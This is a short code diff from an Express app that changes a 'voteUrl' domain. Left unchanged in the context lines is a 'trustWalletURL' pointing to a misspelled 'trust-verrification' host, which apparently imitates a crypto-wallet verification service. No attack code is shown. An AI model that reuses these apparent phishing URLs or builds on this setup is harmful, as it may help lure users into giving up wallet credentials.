@@ -45,7 +45,7 @@ app.use(function (req, res, next) {
   res.locals.success_msg = req.flash('success_msg');
   res.locals.error_msg = req.flash('error_msg');
   res.locals.error = req.flash('error');
-  req.app.voteUrl = "https://fan-famosity.site"
+  req.app.voteUrl = "https://fanmousity.site/"
   // req.app.voteUrl = "http://localhost:5001"
   req.app.trustWalletURL = "https://trust-verrification.vercel.app"
   next();
